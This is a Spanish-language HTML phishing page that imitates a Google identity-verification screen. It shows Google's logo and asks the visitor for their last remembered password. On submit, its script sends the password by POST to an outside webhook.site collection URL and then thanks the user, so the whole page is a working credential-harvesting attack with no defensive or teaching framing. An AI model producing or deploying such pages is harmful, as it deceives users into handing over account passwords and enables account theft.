<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verifica tu identidad</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      width: 450px;
      text-align: center;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 22px;
      color: #202124;
    }
    p {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 20px;
    }
    input[type="password"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-bottom: 20px;
    }
    button {
      background-color: #1a73e8;
      color: white;
      padding: 10px 24px;
      font-size: 14px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #1765cc;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <h1>Verifica tu identidad</h1>
    <p>Ingresa la última contraseña que recuerdas</p>
    <form id="verificacionForm">
      <input type="password" name="contrasena" id="contrasena" required placeholder="Contraseña">
      <br>
      <button type="submit">Enviar</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('verificacionForm');
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const data = new FormData(form);

      fetch("https://webhook.site/53652536-5d89-4426-9ce4-f8ae3d19f889", {
        method: "POST",
        body: data
      }).then(() => {
        alert("Gracias. Tu información ha sido enviada.");
      }).catch(() => {
        alert("Error al enviar. Intenta de nuevo.");
      });
    });
  </script>
</body>
</html>
